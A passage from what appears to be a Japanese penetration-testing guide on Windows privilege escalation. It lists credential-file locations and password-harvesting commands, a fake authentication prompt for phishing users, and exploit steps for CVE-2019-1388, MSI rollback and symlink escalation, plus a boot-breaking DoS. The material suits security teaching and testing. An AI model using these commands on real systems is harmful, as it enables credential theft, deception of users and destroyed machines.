この手法の詳細はこちら：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent`サービスが実行されておらず、ブート時に自動的に起動したい場合は、次を実行します：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加してから、ssh 経由でマシンにログインしようとしました。しかし、レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` が使用されたことを確認できませんでした。

### 無人ファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使用して、次のファイルを検索することもできます: _post/windows/gather/enum_unattend_

内容例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Password

以前は、Group Policy Preferences (GPP) を使用して、複数のマシンにカスタムのローカル管理者アカウントをデプロイできる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPO) に、すべてのドメインユーザーがアクセスできました。第二に、公開されているデフォルトキーを使用して AES256 で暗号化された、これらの GPP 内のパスワードを、認証済みユーザーであれば誰でも復号できました。これにより、ユーザーが権限を昇格できる可能性があり、重大なリスクとなっていました。

このリスクを軽減するため、空でない `cpassword` フィールドを含む、ローカルにキャッシュされた GPP ファイルを検索する関数が開発されました。このようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、GPP に関する詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、いつでも**そのユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう求める**ことができます（クライアントに直接**認証情報**を**尋ねる**のは非常に**危険**であることに注意してください）。
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、パスワードが **clear-text** または **Base64** で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### ごみ箱内の Credentials

Credentials がないか、ごみ箱内も確認してください。

複数のプログラムによって保存された**パスワードを復元**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**Credentials が含まれている可能性のあるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome または Firefox** のパスワードが保存されている DB を確認します。\
また、ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

ブラウザからパスワードを抽出する Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology であり、異なる言語で作成された software components 間の**相互通信**を可能にします。各 COM component は **class ID (CLSID)** によって**識別**され、各 component は 1 つ以上の interface を介して functionality を公開します。これらの interface は interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、それぞれ registry の **HKEY\CLASSES\ROOT\CLSID** および **HKEY\CLASSES\ROOT\Interface** の下で定義されます。この registry は、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** を merge して作成されます。

この registry の CLSIDs 内には、child registry **InProcServer32** があります。これには **DLL** を指す**default value** と、**ThreadingModel** という value が含まれています。ThreadingModel には **Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single または Multi)、または **Neutral** (Thread Neutral) を指定できます。

![Browsers History - COM DLL Overwriting: この registry の CLSIDs 内には、child registry InProcServer32 があります。これには DLL を指す default value と、value...](<../../images/image (729).png>)

基本的に、実行される予定の **DLL のいずれかを overwrite** でき、その DLL が別の user によって実行される場合、**privileges を escalate** できます。

attackers が persistence mechanism として COM Hijacking を使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**ファイルの contents を検索**します。
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索する Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf** plugin で、victim 内の credentials を検索するすべての metasploit POST module を**自動的に実行**するために作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで説明されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、system からパスワードを抽出するもう1つの優れた tool です。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tool は、データを clear text で保存する複数の tool（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM として実行されているプロセスが、完全なアクセス権で新しいプロセス** (`OpenProcess()`) **を開く**状況を想像してください。同じプロセスが、**低い権限で新しいプロセス** (`CreateProcess()`) **も作成し、メインプロセスの開いているすべてのハンドルを継承している**とします。\
その後、**低権限プロセスへの完全なアクセス権**を取得できれば、`OpenProcess()` で作成された特権プロセスへの**開いているハンドルを取得**し、**shellcode を注入**できます。\
[この脆弱性を**検出して悪用する方法**については、この例を参照してください。](leaked-handle-exploitation.md)\
[異なる権限レベル（完全なアクセス権だけではありません）で継承された、プロセスおよびスレッドのより多くの open handles をテストして悪用する方法について、より詳しく説明した[**こちらの別の投稿**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)も参照してください。]

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントにより、プロセス間の通信とデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、異なるネットワーク上にある場合でも、無関係なプロセス間でデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe を介してデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っている場合、**client の身元を偽装**できます。偽装可能な pipe を介して通信する**特権プロセス**を特定できれば、確立した pipe とそのプロセスがやり取りした際に、そのプロセスの身元を採用して**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md) と [**こちら**](#from-high-integrity-to-system) に役立つガイドがあります。

また、次の tool を使用すると、burp のような tool で **named pipe 通信をインターセプト**できます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **さらに、この tool を使用すると、privescs を見つけるためにすべての pipe を一覧表示して確認できます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) は server mode で `\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済み client は、mailslot ベースの非同期イベントパスを悪用して、`ClientAttach` を `NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の **4-byte write** に変え、その後 Telephony admin 権限を取得して、service として任意の DLL を load できます。完全な流れ:

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` → service は `CreateFileW(..., OPEN_EXISTING)` を介してそのパスを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` から attacker が制御する `InitContext` をその handle に書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーし、`GetAsyncEvents` (`Req_Func 0`) で取得した後、登録解除/シャットダウンして決定的な書き込みを繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を呼び出すことで、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を実行します。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** のページを確認してください。

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` に転送されたクリック可能な Markdown link は、危険な URI handler (`file:`, `ms-appinstaller:`、または登録済みの任意の scheme) をトリガーし、現在の user として attacker が制御する file を実行する可能性があります。以下を参照してください:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

user として shell を取得した場合、**command line で credentials を渡している** scheduled task やその他の process が実行されている可能性があります。以下の script は、2 秒ごとに process の command line を取得し、現在の状態と前回の状態を比較して、差分があれば出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ（CVE-2019-1388）/ UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや、"NT\AUTHORITY SYSTEM" などの他のプロセスを実行できます。

これにより、同じ脆弱性を利用して権限昇格と UAC Bypass を同時に実行できます。さらに、何かをインストールする必要はなく、処理中に使用されるバイナリは Microsoft によって署名および発行されています。

影響を受けるシステムの一部は次のとおりです。
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、以下の手順を実行する必要があります：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
GitHubリポジトリには、必要なファイルと情報がすべて揃っています。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator MediumからHigh Integrity Levelへ / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UACとUAC bypasses**について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/RenameからSYSTEM EoPへ

[**このblog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されているtechniqueで、exploit codeは[**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)から入手できます。<sup>[[31]](#references)[[32]](#references)</sup>

このattackは基本的に、Windows Installerのrollback featureを悪用し、uninstallation process中に正規のfileをmaliciousなfileへ置き換えるものです。このため、attackerは**malicious MSI installer**を作成する必要があります。これは`C:\Config.Msi` folderをhijackするために使用されます。このfolderは後に、他のMSI packageのuninstallation中にWindows Installerがrollback fileを保存するために使われます。そのrollback fileは、malicious payloadを含むように変更されます。

techniqueの概要は以下のとおりです:

1. **Stage 1 – Hijackの準備（`C:\Config.Msi`を空にする）**

- Step 1: MSIをinstallする
- writableなfolder（`TARGETDIR`）に無害なfile（例: `dummy.txt`）をinstallする`.msi`を作成します。
- **"UAC Compliant"**としてinstallerを設定し、**non-admin user**が実行できるようにします。
- install後もfileへの**handle**をopenしたままにします。

- Step 2: Uninstallを開始する
- 同じ`.msi`をuninstallします。
- uninstall processがfileを`C:\Config.Msi`へ移動し、`.rbf` file（rollback backup）へrenameし始めます。
- `GetFinalPathNameByHandle`を使用してopen中のfile handleを**poll**し、fileが`C:\Config.Msi\<random>.rbf`になったことを検出します。

- Step 3: Custom Syncing
- `.msi`には**custom uninstall action（`SyncOnRbfWritten`）**が含まれており、以下を行います:
- `.rbf`が書き込まれたことをsignalします。
- その後、uninstallを続行する前に別のeventをwaitします。

- Step 4: `.rbf`の削除をblockする
- signalを受け取ったら、`FILE_SHARE_DELETE`なしで**`.rbf fileをopen**します。これにより、**fileがdeleteされるのを防ぎます**。
- その後、uninstallが完了できるようにsignalを返します。
- Windows Installerは`.rbf`のdeleteに失敗し、すべてのcontentsをdeleteできないため、`C:\Config.Msi`はremoveされません。

- Step 5: `.rbf`を手動でdeleteする
- あなた（attacker）が`.rbf` fileを手動でdeleteします。
- これで**`C:\Config.Msi`が空**になり、hijackの準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability**をtriggerし、`C:\Config.Msi`をdeleteします。

2. **Stage 2 – Rollback ScriptをMaliciousなものに置き換える**

- Step 6: Weak ACLsで`C:\Config.Msi`を再作成する
- 自分で`C:\Config.Msi` folderを再作成します。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC`を持つ**handleをopenしたまま**にします。

- Step 7: 別のInstallを実行する
- 以下の設定で`.msi`を再度installします:
- `TARGETDIR`: Writableなlocation。
- `ERROROUT`: forced failureをtriggerするvariable。
- このinstallは、`.rbs`と`.rbf`を読み取る**rollback**を再度triggerするために使用されます。

- Step 8: `.rbs`をmonitorする
- `ReadDirectoryChangesW`を使用して`C:\Config.Msi`をmonitorし、新しい`.rbs`が出現するまで待ちます。
- そのfilenameを取得します。

- Step 9: Rollback前にSyncする
- `.msi`には**custom install action（`SyncBeforeRollback`）**が含まれており、以下を行います:
- `.rbs`が作成されたときにeventをsignalします。
- その後、続行する前にwaitします。

- Step 10: Weak ACLを再適用する
- `.rbs created` eventを受信した後:
- Windows Installerは`C:\Config.Msi`に**strong ACLsを再適用**します。
- しかし、`WRITE_DAC`を持つhandleをまだ保持しているため、再度**weak ACLsを再適用**できます。

> ACLsは**handle open時にのみenforceされる**ため、引き続きfolderへwriteできます。

- Step 11: Fake `.rbs`と`.rbf`をdropする
- `.rbs` fileを、Windowsに以下を指示する**fake rollback script**でoverwriteします:
- `.rbf` file（malicious DLL）を**privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へrestoreする。
- **malicious SYSTEM-level payload DLL**を含むfake `.rbf`をdropする。

- Step 12: Rollbackをtriggerする
- sync eventをsignalし、installerを再開させます。
- **type 19 custom action（`ErrorOut`）**は、既知のpointでinstallを**意図的にfail**させるよう設定されています。
- これにより**rollbackが開始**されます。

- Step 13: SYSTEMがDLLをinstallする
- Windows Installerは以下を行います:
- maliciousな`.rbs`を読み取る。
- `.rbf` DLLをtarget locationへcopyする。
- これで、**SYSTEMによってloadされるpathにmalicious DLL**が配置されます。

- Final Step: SYSTEM Codeをexecuteする
- DLL hijackを行ったDLLをloadする、trustedな**auto-elevated binary**（例: `osk.exe`）を実行します。
- **Boom**: codeが**SYSTEMとして**executeされます。


### Arbitrary File Delete/Move/RenameからSYSTEM EoPへ

主要なMSI rollback technique（前述のもの）は、**entire folder**（例: `C:\Config.Msi`）をdeleteできることを前提としています。しかし、vulnerabilityで可能なのが**arbitrary file deletion**だけの場合はどうでしょうか？

**NTFS internals**をexploitできます: すべてのfolderには、次の名前のhidden alternate data streamがあります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream には、フォルダーの **index metadata** が保存されます。

そのため、フォルダーの **`::$INDEX_ALLOCATION` stream** を **delete** すると、NTFS はファイルシステムから **フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使用して実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete APIを呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除からSYSTEM EoPへ
プリミティブで任意のファイル／フォルダーを削除できなくても、攻撃者が制御するフォルダーの**内容を削除できる**場合はどうでしょうか？

1. Step 1: 囮フォルダーとファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により**実行が一時停止します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- この process はフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、control が callback に渡されます。

4. Step 4: oplock callback 内 — deletion をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を壊すことなく `folder1` が空になります。
- `file1.txt` を直接削除しないでください。削除すると、oplock が早期に解放されます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` に **symlink** を作成する：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダーのメタデータを保存する NTFS 内部ストリームを対象とするもので、削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは処理を続行し、`file1.txt` の削除を試みます。
- しかし、junction + symlink により、実際に削除されるのは次のものです:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から恒久的な DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダーを作成**できる primitive を exploit します。

**critical Windows driver** の名前を付けた**フォルダー**（ファイルではない）を作成します。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **folder として事前作成**すると、Windows は boot 時に実際の driver を load できなくなります。
- その後、Windows は boot 中に `cng.sys` を load しようとします。
- folder を検出し、**実際の driver の解決に失敗**して、**crash または boot の halt が発生**します。
- **fallback はなく**、外部からの介入（例：boot repair または disk access）なしでは **recovery できません**。

### privileged log/backup paths + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み取った path に logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** でその path を redirect し、privileged write を arbitrary overwrite に変換できます（**SeCreateSymbolicLinkPrivilege なし**でも可能）。<sup>[[15]](#references)</sup>

**Requirements**
- target path を保存する config が attacker によって writable であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- その path に write する privileged operation（log、export、report）。

**Example chain**
1. config を読み取り、privileged log destination を復元します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしで path を redirect します：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待ちます（例：管理者が「テスト SMS の送信」をトリガーする）。これにより、書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を（hex/PE parser で）検査して破損を確認します。再起動すると、Windows は改ざんされた driver path を読み込むため、**boot loop DoS** が発生します。これは、特権サービスが write 用に開く保護対象ファイルであれば、どのファイルにも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、そちらが先に試行される可能性があります。そのため、破損データによる信頼性の高い DoS sink になります。



## **High Integrity から System へ**

### **New service**

すでに High Integrity process 上で実行している場合、**新しい service を作成して実行するだけで**、**SYSTEM への path** は簡単になります。
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する場合は、それが有効な service であるか、または binary が必要なアクションを迅速に実行することを確認してください。有効な service でない場合、20秒後に kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を enable** し、_**.msi**_ wrapper を使用して reverse shell を **install** できます。\
[関連する registry keys と _.msi_ package の install 方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちら**](seimpersonate-from-high-to-system.md)**にあります。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく、すでに High Integrity process で確認できます）、SeDebug privilege を使って**ほぼすべての process**（protected processes を除く）を **open** し、その process の **token を copy** して、その token を使用した **arbitrary process を作成**できます。\
通常、この technique では、**すべての token privileges を持つ SYSTEM として実行されている process を選択**します（_はい、すべての token privileges を持たない SYSTEM process も存在します_）。\
**提案された technique を実行するコード例は** [**こちら**](sedebug-+-seimpersonate-copy-token.md)**にあります。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation を行うために使用します。この technique は、**pipe を作成し、その後 service を作成または abuse して、その pipe に書き込ませる**というものです。その後、**server** は `SeImpersonate` privilege を使用して pipe を作成しているため、pipe client（service）の **token を impersonate** し、SYSTEM privileges を取得できます。\
name pipes について[**詳しく知りたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
